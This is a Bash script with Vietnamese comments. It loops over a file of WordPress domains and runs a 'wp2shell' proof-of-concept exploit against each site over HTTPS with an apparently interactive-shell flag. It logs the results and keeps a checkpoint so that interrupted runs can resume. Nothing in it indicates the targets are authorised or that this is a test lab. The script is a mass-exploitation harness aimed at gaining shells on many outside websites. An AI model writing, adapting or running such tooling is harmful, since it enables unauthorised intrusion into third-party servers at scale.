# Reference: https://github.com/Icex0/wp2shell-poc

#!/usr/bin/env bash
# Cách dùng: ./run_all.sh <user> [--reset]
set -uo pipefail

FILE="./data/wp_domain.txt"
OUT="results.txt"
CHECKPOINT=".run_checkpoint"

# ── Kiểm tra tham số ──────────────────────────────────────────────────────────
[ -z "${1:-}" ] && { echo "Dùng: $0 <user> [--reset]" >&2; exit 1; }
[ ! -f "$FILE" ] && { echo "Lỗi: Không tìm thấy file $FILE" >&2; exit 2; }

USER_CMD="$1"
FORCE_RESET="${2:-}"

# ── Reset nếu yêu cầu ─────────────────────────────────────────────────────────
if [ "$FORCE_RESET" = "--reset" ]; then
    rm -f "$CHECKPOINT"
    echo "🗑  Đã xóa checkpoint — bắt đầu lại từ đầu."
fi

# ── Đọc checkpoint ────────────────────────────────────────────────────────────
START_FROM=0
if [ -f "$CHECKPOINT" ]; then
    cp_user=$(sed -n '1p' "$CHECKPOINT")
    cp_line=$(sed -n '2p' "$CHECKPOINT")
    if [ "$cp_user" = "$USER_CMD" ] && [[ "$cp_line" =~ ^[0-9]+$ ]] && [ "$cp_line" -gt 0 ]; then
        START_FROM="$cp_line"
        echo "⟳  Resume từ dòng $((START_FROM + 1)) (đã hoàn thành $START_FROM dòng)"
    else
        echo "⚠  Checkpoint không khớp (user đổi?) — chạy lại từ đầu."
    fi
fi

# ── Hàm lưu checkpoint ────────────────────────────────────────────────────────
# Lưu 2 dòng: user và số thứ tự dòng đã xong
save_checkpoint() {
    printf '%s\n%d\n' "$USER_CMD" "$1" > "$CHECKPOINT"
}

# ── Xử lý dừng đột ngột (Ctrl+C / kill) ──────────────────────────────────────
n=0
on_interrupt() {
    printf '\n⏸  Dừng sau dòng %d. Checkpoint đã lưu → "%s"\n' "$n" "$CHECKPOINT"
    printf '   Chạy lại: %s %s  để tiếp tục.\n' "$0" "$USER_CMD"
    exit 130
}
trap 'on_interrupt' SIGINT SIGTERM

# ── Vòng lặp chính ────────────────────────────────────────────────────────────
while IFS= read -r raw_line || [ -n "$raw_line" ]; do
    line=$(echo "$raw_line" | tr -d '\r' | xargs)
    [ -z "$line" ]       && continue
    [[ "$line" =~ ^# ]]  && continue

    n=$((n + 1))

    # Bỏ qua dòng đã chạy trước đó
    if [ "$n" -le "$START_FROM" ]; then
        printf '  ↷  [%d] Skip: %s\n' "$n" "$line"
        continue
    fi

    printf '→  [%d] %s\n' "$n" "$line"

    {
        echo "=== [$n] $line ==="
        python3 wp2shell.py "$USER_CMD" "https://$line" -i 2>&1
        echo
    } >> "$OUT"

    # Lưu checkpoint SAU khi python3 xong (dù thành công hay lỗi)
    # → nếu bị Ctrl+C ngay trong python3, dòng này sẽ chạy lại ở lần sau
    save_checkpoint "$n"

done < "$FILE"

# ── Hoàn thành toàn bộ → xóa checkpoint ──────────────────────────────────────
rm -f "$CHECKPOINT"
printf '\n✅  Hoàn thành %d dòng. Kết quả tại: %s\n' "$n" "$OUT"